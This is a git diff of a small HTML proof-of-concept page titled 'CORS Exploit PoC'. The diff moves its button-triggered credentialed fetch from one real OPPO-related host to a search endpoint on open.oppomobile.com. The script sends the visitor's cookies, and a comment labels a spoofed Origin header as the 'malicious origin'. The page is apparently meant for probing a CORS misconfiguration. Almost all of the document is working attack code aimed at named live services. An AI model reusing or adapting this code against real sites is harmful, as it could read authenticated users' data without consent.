@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CORS Exploit</title>
+  <title>CORS Exploit - open.oppomobile.com</title>
 </head>
 <body>
   <h1>CORS Exploit PoC</h1>
@@ -13,14 +13,14 @@
 
   <script>
     document.getElementById("exploit").addEventListener("click", function() {
-      fetch("https://isp.myoas.com/smdm/public/gsrm/v2/lov/region?countryId=25&size=5020", {
+      fetch("https://open.oppomobile.com/bbs/search.php", {
         method: "GET",
         credentials: "include", // Include cookies to simulate an authenticated user
         headers: {
           "Accept": "application/json, text/plain, */*",
-          "Srm-Tenant-Code": "SRM-OPPO",
+          "X-rewrite-url": "/custom/path", // Custom header you provided
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
-          "Referer": "https://isp.myoas.com/home/oppo?page=register",
+          "Referer": "https://open.oppomobile.com/",
           "Origin": "https://revenix-aer.github.io/rev/" // Set the malicious origin
         }
       })
